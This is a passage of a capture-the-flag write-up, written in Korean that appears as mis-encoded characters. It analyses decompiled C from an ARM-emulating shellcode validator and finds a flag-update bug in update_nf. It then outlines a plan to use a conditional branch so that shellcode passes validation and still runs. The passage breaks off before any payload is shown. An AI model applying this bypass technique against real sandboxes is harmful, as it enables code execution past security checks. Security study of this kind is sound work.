class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">emulator</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">reg</span> *<span class="title">reg</span>;</span></span><br><span class="line">  <span class="type">char</span> *<span class="built_in">stack</span>;</span><br><span class="line">  <span class="type">char</span> *code;</span><br><span class="line">  <span class="type">char</span> *heap;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> sp, lr, pc, cpsr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>edit_code</code> í•¨ìˆ˜ëŠ” <code>em-&gt;code</code> ì£¼ì†Œì— ì‹¤í–‰í•  ì½”ë“œë¥¼ ì…ë ¥ë°›ëŠ”ë°, ê¸¸ì´ê°€ 4ì˜ ë°°ìˆ˜ê°€ ì•„ë‹ˆë©´ -1ì„ ë°˜í™˜í•©ë‹ˆë‹¤. ì´ ê²½ìš° <code>main</code> í•¨ìˆ˜ì—ì„œ <code>exit(-1)</code> ì„ í˜¸ì¶œí•˜ì—¬ ì¢…ë£Œí•©ë‹ˆë‹¤. ì…ë ¥ë°›ì€ í›„ <code>exit</code> ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•˜ëŠ” ì½”ë“œë¥¼ ë’¤ì— ë§ë¶™ì…ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit_code</span><span class="params">()</span> <span class="comment">// 0x10af0</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> len; <span class="comment">// [sp+4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  len = read(<span class="number">0</span>, em-&gt;code, <span class="number">4031u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (len &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;em-&gt;code[len], &amp;exit_code, <span class="number">12u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>check_code</code> í•¨ìˆ˜ëŠ” ë°˜ë³µë¬¸ì„ ëŒë©´ì„œ <code>em-&gt;reg-&gt;pc</code> ë¡œë¶€í„° 4ë°”ì´íŠ¸ì”© ì¸ìŠ¤íŠ¸ëŸ­ì…˜ <code>inst</code> ë¥¼ ì½ìŠµë‹ˆë‹¤. <code>check_cpsr</code> í•¨ìˆ˜ë¥¼ <code>inst</code> ë¥¼ ì¸ìë¡œ í˜¸ì¶œí•˜ì—¬ ë¦¬í„´ê°’ì´ 0ì´ ì•„ë‹ˆë©´, switch-case êµ¬ë¬¸ìœ¼ë¡œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ í´ë˜ìŠ¤ì— í•´ë‹¹í•˜ëŠ” <code>check_*</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. <code>check_cpsr</code> í•¨ìˆ˜ê°€ 0ì„ ë¦¬í„´í•˜ê±°ë‚˜ <code>check_*</code> í•¨ìˆ˜ê°€ -1ì„ ë¦¬í„´í•˜ëŠ” ê²½ìš° <code>sigill</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ”ë°, ì´ í•¨ìˆ˜ëŠ” ì˜¤ë¥˜ ë©”ì‹œì§€ë¥¼ ì¶œë ¥í•˜ê³  <code>exit(-1)</code> ë¡œ í”„ë¡œê·¸ë¨ì„ ì¢…ë£Œí•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_code</span><span class="params">()</span> <span class="comment">// 0x10bb0</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> op1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> inst; <span class="comment">// [sp+0h] [bp-Ch]</span></span><br><span class="line">  <span class="type">int</span> fetched; <span class="comment">// [sp+4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( inst = <span class="number">-1</span>; em-&gt;reg-&gt;pc &lt; (<span class="type">unsigned</span> <span class="type">int</span>)(em-&gt;code + <span class="number">4096</span>); inst = fetched )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span> *)em-&gt;reg-&gt;pc &lt; em-&gt;code )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    fetched = *(_DWORD *)em-&gt;reg-&gt;pc;</span><br><span class="line">    em-&gt;reg-&gt;pc += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !inst )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( inst != <span class="number">-1</span> &amp;&amp; !check_cpsr(inst) )</span><br><span class="line">      sigill(inst);</span><br><span class="line">    op1 = get_class(inst);</span><br><span class="line">    <span class="keyword">if</span> ( op1 &lt;= <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( op1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0u</span>:                                <span class="comment">// data processing and miscellaneous instructions</span></span><br><span class="line">          <span class="keyword">if</span> ( check_data_processing(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( check_multiply(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2u</span>:                                <span class="comment">// branch, branch with link, block data transfer</span></span><br><span class="line">          <span class="keyword">if</span> ( check_branch(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          fetched = <span class="number">-1</span>;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3u</span>:                                <span class="comment">// supervisor call</span></span><br><span class="line">          <span class="keyword">if</span> ( check_syscall() == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4u</span>:                                <span class="comment">// load/store word and unsigned byte</span></span><br><span class="line">          <span class="keyword">if</span> ( check_load_store(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( op1 != <span class="number">-1</span> )</span><br><span class="line">LABEL_23:</span><br><span class="line">      sigill(inst);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ê°ê°ì˜ <code>check_*</code> í•¨ìˆ˜ëŠ” ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ í˜•ì‹ì´ë‚˜ ì¸ìë¥¼ ê²€ì‚¬í•œ í›„, í†µê³¼í•˜ë©´ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì‹¤í–‰ ê²°ê³¼ë¥¼ <code>emulator</code> êµ¬ì¡°ì²´ ë³€ìˆ˜ <code>em</code> ì— ë°˜ì˜í•˜ê³  í†µê³¼í•˜ì§€ ëª»í•œ ê²½ìš° -1ì„ ë¦¬í„´í•˜ì—¬ ì¢…ë£Œí•˜ë„ë¡ í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ <code>check_branch</code> í•¨ìˆ˜ëŠ” ì¸ìê°€ ìƒìˆ˜(immediate) ê°’ì¸ ë¶„ê¸° ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ê²€ì‚¬í•˜ê³  <code>em-&gt;reg-&gt;pc</code> ë¥¼ ê°±ì‹ í•˜ëŠ”ë°, ì¡°ê±´ë¬¸ì„ í†µí•´ ëª©ì ì§€ ì£¼ì†Œê°€ <code>em-&gt;code</code> ë¡œ í• ë‹¹ëœ ë©”ëª¨ë¦¬ë¥¼ ë²—ì–´ë‚˜ëŠ” ê²½ìš° -1ì„ ë°˜í™˜í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_branch</span><span class="params">(<span class="type">int</span> inst)</span>   <span class="comment">// 0x11f28</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r3</span></span><br><span class="line"></span><br><span class="line">  v1 = shl8(inst);</span><br><span class="line">  v2 = <span class="number">4</span> * (v1 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ((v1 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x20000000</span>) != <span class="number">0</span> )</span><br><span class="line">    v2 += <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( em-&gt;reg-&gt;pc + <span class="number">4</span> * (v2 &gt;&gt; <span class="number">2</span>) &gt;= (<span class="type">unsigned</span> <span class="type">int</span>)(em-&gt;code + <span class="number">0x4000</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  em-&gt;reg-&gt;pc += <span class="number">4</span> * (<span class="number">4</span> * (v1 &gt;&gt; <span class="number">8</span>) / <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4" tabindex="-1">ë¬¸ì œ í’€ì´</h2><p>ë¶„ì„í•œ ê²°ê³¼ë¥¼ ë°”íƒ•ìœ¼ë¡œ ìƒê°í•  ìˆ˜ ìˆëŠ” ìµìŠ¤í”Œë¡œì‡ ì‹œë‚˜ë¦¬ì˜¤ê°€ ë‘ ê°€ì§€ ì •ë„ ìˆìŠµë‹ˆë‹¤.</p><ol><li><code>check_code</code> í•¨ìˆ˜ì˜ <code>check_*</code> ë£¨í‹´ì—ì„œ ìµìŠ¤í”Œë¡œì‡ í”„ë¦¬ë¯¸í‹°ë¸Œ(e.g. ì„ì˜ ì“°ê¸°)ë¥¼ ì°¾ì•„ ìµìŠ¤í”Œë¡œì‡í•œë‹¤.</li><li><code>check_code</code> ì˜ ê²€ì‚¬ë¥¼ í†µê³¼í•˜ë©´ì„œ, <code>main</code> ì—ì„œ ì…ë ¥í•œ ì½”ë“œë¥¼ í˜¸ì¶œí–ˆì„ ë•Œ ìµìŠ¤í”Œë¡œì‡ì´ ìˆ˜í–‰ë˜ëŠ” ì…¸ì½”ë“œë¥¼ ì…ë ¥í•œë‹¤.</li></ol><p>ê·¸ëŸ°ë° <code>check_*</code> í•¨ìˆ˜ë“¤ì€ ëŒ€ë¶€ë¶„ ëª©ì ì§€ ë ˆì§€ìŠ¤í„°ë‚˜ ì£¼ì†Œì˜ ë²”ìœ„ì— ì œí•œì„ ë‘ê³  ìˆì–´ ìµìŠ¤í”Œë¡œì‡ í”„ë¦¬ë¯¸í‹°ë¸Œ êµ¬ì„±ì— ë„ì›€ì´ ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ë‹¤ìŒì€ <code>check_load_store</code> í•¨ìˆ˜ì˜ ì¼ë¶€ì…ë‹ˆë‹¤. 23í–‰, 26í–‰, 32í–‰ ë“±ì„ ë³´ë©´ ëª©ì ì§€ ë ˆì§€ìŠ¤í„°ëŠ” <code>R0</code> , â€¦ , <code>R12</code> ê¹Œì§€ë§Œ ê°€ëŠ¥í•˜ë„ë¡, ì½ê³  ì“°ëŠ” ì£¼ì†ŒëŠ” <code>em-&gt;heap</code> , <code>em-&gt;stack</code> ìœ¼ë¡œ í• ë‹¹ëœ ë©”ëª¨ë¦¬ë§Œ ê°€ëŠ¥í•˜ë„ë¡ ì œí•œì„ ë‘ê³  ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_load_store</span><span class="params">(<span class="type">int</span> inst)</span><span class="comment">// 0x12000</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  bit11_0 = get_bit11_0(inst);</span><br><span class="line">  rn = get_bit16_19(inst);</span><br><span class="line">  <span class="keyword">if</span> ( rn &lt;= <span class="number">12</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    rn_val = (<span class="type">char</span> *)*(&amp;em-&gt;reg-&gt;r0 + rn);</span><br><span class="line">    <span class="keyword">if</span> ( get_bit25(inst) )                      <span class="comment">// bit25 is 1 (A bit)</span></span><br><span class="line">    &#123;</span><br><span class="line">      rm = bit11_0 &amp; <span class="number">0xF</span>;</span><br><span class="line">      <span class="keyword">if</span> ( rm &gt; <span class="number">12</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( get_bit24(inst) )                      <span class="comment">// bit24 is 1 (P bit)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( get_bit23(inst) )                    <span class="comment">// bit23 is 1 (U bit)</span></span><br><span class="line">        v6 = &amp;rn_val[bit11_0];</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v6 = &amp;rn_val[-bit11_0];</span><br><span class="line">      <span class="keyword">if</span> ( get_bit20(inst) )                    <span class="comment">// bit20 is 1</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &lt; em-&gt;heap || v6 &gt; em-&gt;heap + <span class="number">4096</span>) &amp;&amp; (v6 &lt; em-&gt;<span class="built_in">stack</span> || v6 &gt; em-&gt;<span class="built_in">stack</span> + <span class="number">4096</span>) )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        rt = shr12(inst);</span><br><span class="line">        <span class="keyword">if</span> ( rt &gt; <span class="number">0xC</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        *(&amp;em-&gt;reg-&gt;r0 + rt) = *(_DWORD *)v6;   <span class="comment">// load</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &lt; em-&gt;heap || v6 &gt; em-&gt;heap + <span class="number">4096</span>) &amp;&amp; (v6 &lt; em-&gt;<span class="built_in">stack</span> || v6 &gt; em-&gt;<span class="built_in">stack</span> + <span class="number">4096</span>) )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        v13 = shr12(inst);</span><br><span class="line">        <span class="keyword">if</span> ( v13 &gt; <span class="number">0xC</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        *(_DWORD *)v6 = *(&amp;em-&gt;reg-&gt;r0 + v13);  <span class="comment">// store</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>ì‚°ìˆ  ì—°ì‚°ê³¼ ê´€ë ¨ëœ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ê²€ì‚¬í•˜ëŠ” <code>check_data_processing</code> í•¨ìˆ˜ì—ì„œë„ 9í–‰, 11í–‰ ë“±ì—ì„œ ì‚°ìˆ  ì—°ì‚°ì˜ ëª©ì ì§€ì™€ ì¸ì ë ˆì§€ìŠ¤í„°ì— ì œí•œì„ ë‘ê³  ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ°ë° ì‹¤ì œ ì—°ì‚°ì˜ ê²°ê³¼ë¥¼ ë°˜ì˜í•˜ëŠ” ì„œë¸Œë£¨í‹´ì—ì„œ í¥ë¯¸ë¡œìš´ ì½”ë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_data_processing</span><span class="params">(<span class="type">int</span> inst)</span><span class="comment">// 0x117b8</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  v7 = sub_114E0(inst);</span><br><span class="line">  bit11_0 = get_bit11_0(inst);</span><br><span class="line">  bit16_19 = get_bit16_19(inst);</span><br><span class="line">  v10 = shr12(inst);</span><br><span class="line">  bit20 = get_bit20(inst);</span><br><span class="line">  <span class="keyword">if</span> ( bit16_19 &lt; <span class="number">0</span> || bit16_19 &gt; <span class="number">12</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v10 &lt; <span class="number">0</span> || v10 &gt; <span class="number">12</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">switch</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( check_add(bit16_19, v4, v10, bit20) == <span class="number">-1</span> )</span><br><span class="line">        sigill(inst);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p><code>check_add</code> í•¨ìˆ˜ëŠ” <code>check_data_processing</code> í•¨ìˆ˜ì—ì„œ <code>ADD</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ê²°ê³¼ë¥¼ ë°˜ì˜í•˜ê¸° ìœ„í•´ í˜¸ì¶œí•˜ëŠ” ì„œë¸Œë£¨í‹´ì…ë‹ˆë‹¤. ì´ í•¨ìˆ˜ëŠ” ì—°ì‚° ê²°ê³¼ë¥¼ ëª©ì ì§€ ë ˆì§€ìŠ¤í„°ì— ëŒ€ì…í•˜ê³ , <code>update_zf_nf</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ <code>CPSR</code> ë ˆì§€ìŠ¤í„°ì˜ í”Œë˜ê·¸ë¥¼ ê°±ì‹ í•˜ê³  ìˆìŠµë‹ˆë‹¤. (<code>update_zf_nf</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ì¡°ê±´ <code>a4</code> ëŠ” ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ bit 20ì´ ì „ë‹¬ëœ ê°’ìœ¼ë¡œ, <code>S</code> ë¹„íŠ¸ì— í•´ë‹¹í•©ë‹ˆë‹¤)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_add</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span><span class="comment">// 0x12fb8</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// [sp+14h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  update_cf(*(&amp;em-&gt;reg-&gt;r0 + a1) + a2 &lt; *(&amp;em-&gt;reg-&gt;r0 + a1));</span><br><span class="line">  result = a2 + *(&amp;em-&gt;reg-&gt;r0 + a1);</span><br><span class="line">  <span class="keyword">if</span> ( a4 )</span><br><span class="line">    update_zf_nf(result);</span><br><span class="line">  *(&amp;em-&gt;reg-&gt;r0 + a3) = result;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>update_zf_nf</code> í•¨ìˆ˜ëŠ” ì¸ìë¡œ ë°›ì€ ì—°ì‚° ê²°ê³¼ë¥¼ <code>update_zf</code> , <code>update_nf</code> í•¨ìˆ˜ì— ì „ë‹¬í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">update_zf_nf</span><span class="params">(<span class="type">int</span> a1)</span><span class="comment">// 0x12d4c</span></span><br><span class="line">&#123;</span><br><span class="line">  update_zf(a1);</span><br><span class="line">  update_nf(a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>update_nf</code> í•¨ìˆ˜ëŠ” ì—°ì‚°ì˜ ê²°ê³¼ê°€ 0ì´ ì•„ë‹ ê²½ìš° ë¹„íŠ¸ ì—°ì‚°ì„ í†µí•´ <code>em-&gt;reg-&gt;cpsr</code> ê°’ì˜ bit 31ì— 1ì„ ëŒ€ì…í•©ë‹ˆë‹¤. ì´ëŠ” <code>CPSR</code> ë ˆì§€ìŠ¤í„°ì˜ <code>N</code> ë¹„íŠ¸ì— í•´ë‹¹í•˜ëŠ”ë°, ì •ì˜ ìƒ <code>N</code> ë¹„íŠ¸ëŠ” ê²°ê³¼ê°€ ìŒìˆ˜ì¸ ê²½ìš°(ìµœìƒìœ„ ë¹„íŠ¸ê°€ 1ì¸ ê²½ìš°) 1ì´ì–´ì•¼ í•©ë‹ˆë‹¤. ë”°ë¼ì„œ <code>update_nf</code> í•¨ìˆ˜ëŠ” <code>em-&gt;reg-&gt;cpsr</code> ê°’ì„ ì‹¤ì œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ê²°ê³¼ì™€ ë‹¤ë¥´ê²Œ ë°˜ì˜í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">update_nf</span><span class="params">(<span class="type">int</span> a1)</span>    <span class="comment">// 0x12ccc</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">    em-&gt;reg-&gt;cpsr |= <span class="number">0x80000000</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    em-&gt;reg-&gt;cpsr &amp;= <span class="number">0x70000000</span>u;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´ë¥¼ ì´ìš©í•´ ë‹¤ìŒê³¼ ê°™ì´ ì…€ì½”ë“œë¥¼ ì…ë ¥í•˜ê³ ë„ <code>check_code</code> í•¨ìˆ˜ë¥¼ í†µê³¼í•˜ì—¬ ì‹¤í–‰í•˜ëŠ” ìµìŠ¤í”Œë¡œì‡ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (ë‹¨ìˆœ ì…¸ì½”ë“œë¥¼ ì…ë ¥í•˜ë©´ <code>check_syscall</code> í•¨ìˆ˜ì—ì„œ ì‹œìŠ¤í…œ ì½œ ë²ˆí˜¸ë¥¼ í•„í„°ë§í•˜ì—¬ ì¢…ë£Œí•©ë‹ˆë‹¤)</p><ol><li>ì‚°ìˆ  ì—°ì‚°ì„ í†µí•´ <code>em-&gt;reg-&gt;cpsr</code> ì˜ <code>N</code> ë¹„íŠ¸ê°€ 1ì´ ë˜ë„ë¡ í•©ë‹ˆë‹¤. (ì˜ëª» ë°˜ì˜ëœ ê²°ê³¼ì…ë‹ˆë‹¤)</li><li><code>N</code> ë¹„íŠ¸ì™€ ê´€ë ¨ëœ ì¡°ê±´ ë¶„ê¸°ë¥¼ í†µí•´ ì…¸ì½”ë“œ ë¶€ë¶„ì„ ì‹¤í–‰í•˜ì§€ ì•Šê³  ì í”„í•˜ë„ë¡ í•©ë‹ˆë‹¤.</li><li>ì‹¤ì œ ì‹¤í–‰ ì‹œì—ëŠ” <code>N</code> ë¹„íŠ¸ê°€ 0ìœ¼ë¡œ ì¡°ê±´ ë¶„ê¸°ë¥¼ ìˆ˜í–‰í•˜ì§€ ì•Šì•„, ì…¸ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê²Œ ë©ë‹ˆë‹¤.</li></ol><p><code>check_cpsr</code> í•¨ìˆ˜ë¥¼ ë³´ë©´ ëª¨ë“  ì¡°ê±´ì´ êµ¬í˜„ë˜ì–´ ìˆì§€ëŠ” ì•Šì§€ë§Œ, <code>LT</code> (signed less than) ì¡°ê±´ì€ êµ¬í˜„ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì…¸ì½”ë“œ ì´ì „ì— ê²°ê³¼ê°€ 0ì´ ì•„ë‹Œ ì‚°ìˆ  ì—°ì‚°ì„ 